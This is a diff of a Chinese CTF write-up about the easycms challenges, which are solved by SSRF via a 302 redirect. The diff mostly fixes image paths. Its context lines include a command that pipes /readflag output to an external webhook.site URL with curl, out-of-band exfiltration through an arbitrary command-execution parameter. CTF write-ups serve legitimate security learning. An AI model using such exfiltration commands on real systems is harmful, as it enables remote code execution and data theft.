@@ -113,11 +113,14 @@ http://eci-2ze3cmcfbu4h73d67lga.cloudeci1.ichunqiu.com/index.php
 
 302配置如下
 
-![image-20240523154243866](../ssrf/image-20240523154243866.png)
+
+<!--more-->
+
+![image-20240523154243866](./image-20240523154243866.png)
 
 cmd处可任意命令执行，执行readflag外带flag /readflag | curl -X POST -d @- https://webhook.site/c8aa80e1-fbab-4051-b280-212f3a50a3e7
 
-![image-20240523154302340](../ssrf/image-20240523154302340.png)
+![image-20240523154302340](./image-20240523154302340.png)
 
 ### 题目easycms_revenge：
 
@@ -136,8 +139,8 @@ http://eci-2zeflmaf18ustq2ioeb5.cloudeci1.ichunqiu.com/index.php
 
 通过302到本地然后读取文件执行命令
 
-![image-20240523154404026](../ssrf/image-20240523154404026.png)
+![image-20240523154404026](./image-20240523154404026.png)
 
 外带flag
 
-![image-20240523154423155](../ssrf/image-20240523154423155.png)
+![image-20240523154423155](./image-20240523154423155.png)
